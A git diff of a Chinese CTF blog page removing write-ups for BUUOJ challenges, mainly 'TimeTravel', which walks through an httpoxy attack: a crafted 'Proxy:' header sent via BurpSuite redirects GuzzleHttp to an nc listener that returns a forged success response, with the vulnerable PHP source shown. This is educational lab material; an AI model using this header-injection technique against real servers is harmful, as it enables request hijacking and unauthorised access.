!elements.bIsMine)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  Elements[,] eleGrids2 = <span class="keyword">this</span>.eleGrids;</span><br><span class="line">  <span class="keyword">int</span> upperBound3 = eleGrids2.GetUpperBound(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">int</span> upperBound4 = eleGrids2.GetUpperBound(<span class="number">1</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> lowerBound1 = eleGrids2.GetLowerBound(<span class="number">0</span>); lowerBound1 &lt;= upperBound3; ++lowerBound1)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> lowerBound2 = eleGrids2.GetLowerBound(<span class="number">1</span>); lowerBound2 &lt;= upperBound4; ++lowerBound2)</span><br><span class="line">      eleGrids2[lowerBound1, lowerBound2].DawnsLight();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure> 我们把那个return false以及上面的if注释掉，DawnsLight()会直接执行。 编译后替换文件执行后，点击就会显示二维码。 <img src="/2020/06/02/BUUOJ%E5%88%B7%E9%A2%98-Misc-Mine-Sweeping/QRCode.png" class=""> 扫就行了。</p>
-
-    <div id="aplayer-rNchLhpB" class="aplayer aplayer-tag-marker meting-tag-marker"
-         data-id="26102207" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="true" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#ad7a86" data-loop="all"
-    ></div>
-<p>flag{269bc18b-081d-49e7-b0b2-2c0847e6edf8}</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://tiaonmmn.github.io/2020/06/01/BUUOJ%E5%88%B7%E9%A2%98-Web-TimeTravel/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/avatar.jpeg">
-      <meta itemprop="name" content="Tiaonmmn.ZMZ">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Tiaonmmn's Littile House">
-    </span>
-
-    
-    
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/06/01/BUUOJ%E5%88%B7%E9%A2%98-Web-TimeTravel/" class="post-title-link" itemprop="url">BUUOJ刷题-TimeTravel</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-      
-
-      <time title="创建时间：2020-06-01 09:02:27 / 修改时间：09:35:51" itemprop="dateCreated datePublished" datetime="2020-06-01T09:02:27+08:00">2020-06-01</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/Writeups/" itemprop="url" rel="index"><span itemprop="name">Writeups</span></a>
-        </span>
-    </span>
-
-  
-  
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Valine：</span>
-    
-    <a title="valine" href="/2020/06/01/BUUOJ%E5%88%B7%E9%A2%98-Web-TimeTravel/#valine-comments" itemprop="discussionUrl">
-      <span class="post-comments-count valine-comment-count" data-xid="/2020/06/01/BUUOJ%E5%88%B7%E9%A2%98-Web-TimeTravel/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-      </div>
-      <div class="post-meta">
-    <span class="post-meta-item" title="本文字数">
-      <span class="post-meta-item-icon">
-        <i class="far fa-file-word"></i>
-      </span>
-      <span class="post-meta-item-text">本文字数：</span>
-      <span>2.2k</span>
-    </span>
-    <span class="post-meta-item" title="阅读时长">
-      <span class="post-meta-item-icon">
-        <i class="far fa-clock"></i>
-      </span>
-      <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>2 分钟</span>
-    </span>
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>V&amp;N 2020公开赛的TimeTravel。 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require</span> <span class="keyword">__DIR__</span> . <span class="string">&#x27;/vendor/autoload.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">GuzzleHttp</span>\<span class="title">Client</span>;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;flag&#x27;</span>])) &#123;</span><br><span class="line">    $client = <span class="keyword">new</span> Client();</span><br><span class="line">    $response = $client-&gt;get(<span class="string">&#x27;http://127.0.0.1:5000/api/eligible&#x27;</span>);</span><br><span class="line">    $content = $response-&gt;getBody();</span><br><span class="line">    $data = json_decode($content, <span class="literal">TRUE</span>);</span><br><span class="line">    <span class="keyword">if</span>($data[<span class="string">&#x27;success&#x27;</span>] === <span class="literal">true</span>) &#123;</span><br><span class="line">      <span class="keyword">echo</span> system(<span class="string">&#x27;/readflag&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    highlight_file($_GET[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;phpinfo&#x27;</span>])) &#123;</span><br><span class="line">    phpinfo();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure> 用到了GuzzleHttp，是个HTTP库来着。如果GET传入flag，会访问127.0.0.1:5000/api/eligible，返回的JSON有{"success":true}就读flag。GET传入file会任意读文件，GET传入phpinfo返回phpinfo()结果。</p>
-<p>显然，直接读flag没可能，不会有那个权限，否则就不会再套层/readflag了。令我们好奇的是，他用了一个GuzzleHttp，显然这个库不是随便找的，一定有问题。</p>
-<p>Google搜一下"guzzlehttp vuln"，排名第一的就告诉我们<a target="_blank" rel="noopener" href="https://snyk.io/vuln/SNYK-PHP-GUZZLEHTTPGUZZLE-70104">问题</a>了，HTTP Request Redirection，又名httpoxy。直接搜就能搜到官网，简单来说，PHP等Web框架在CGI模式下运行时，会将传入的HTTP头当作CGI应用程序的环境变量，而对于PHP来说，它会使用getenv()获取环境变量，在php-fpm等CGI模式下会把HTTP头合并到<span class="math inline">\(\_SERVER数组中。因此，如果我们传入Proxy: 127.0.0.1，在PHP端的\)</span>_SERVER会导致出现$_SERVER['HTTP_PROXY']赋值为'127.0.0.1'。而一部分的HTTP库会应用HTTP_PROXY变量作为代理，例如GuzzleHttp。也就是说，如果我们在访问页面时加上一个Proxy: 127.0.0.1:8080的HTTP头，GuzzleHttp访问时会把请求代理给127.0.0.1:8080。我们就有机会修改内容了。</p>
-<p>不过要注意的是，CGI在传入HTTP头时，会添加HTTP_前缀，如HTTP_HOST。</p>
-<p>本题完全符合条件，我们传入Proxy: XXX:YY，就会把对127.0.0.1:5000/api/eligible的请求转发到XXX:YY，我们再修改返回内容即可。</p>
-<p>由于是BUUOJ环境，不能用外部服务器，我们用Linux Labs的nc来完成。</p>
-<p>先用BurpSuite拦截请求</p>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?flag</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: node3.buuoj.cn:26215</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36 Edg/83.0.478.37</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line"><span class="attribute">DNT</span>: 1</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Proxy</span>: 174.1.23.2:8080</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>Proxy地址指向Linux Labs的IP，上面用nc监听8080端口。在Linux Labs上修改返回包。 <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Server</span>: nginx/1.14.2</span><br><span class="line"><span class="attribute">Date</span>: Mon, 01 Jun 2020 01:30:05 GMT</span><br><span class="line"><span class="attribute">Content-Type</span>: text/html; charset=UTF-8</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">X-Powered-By</span>: PHP/5.6.23</span><br><span class="line"><span class="attribute">Content-Length</span>: 12</span><br><span class="line"></span><br><span class="line">&#123;&quot;success&quot;:true&#125;</span><br></pre></td></tr></table></figure></p>
-<p>就可以得到flag了。</p>
-
-    <div id="aplayer-JnNMVJyW" class="aplayer aplayer-tag-marker meting-tag-marker"
-         data-id="4919519" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="true" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#ad7a86" data-loop="all"
-    ></div>
-<p>flag{d00bc26f-ce1d-406b-8742-91079447e475}</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/8/">8</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
+    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/9/">9</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
   </nav>
 
 
@@ -1594,14 +1591,14 @@ $filter = "/union|and|\bor\b|information_schema|updatexml/i";
       <i class="fa fa-chart-line"></i>
     </span>
       <span>站点总字数：</span>
-    <span title="站点总字数">330k</span>
+    <span title="站点总字数">342k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
       <span>站点阅读时长 &asymp;</span>
-    <span title="站点阅读时长">5:01</span>
+    <span title="站点阅读时长">5:11</span>
   </span>
 </div>
 <div class="busuanzi-count">
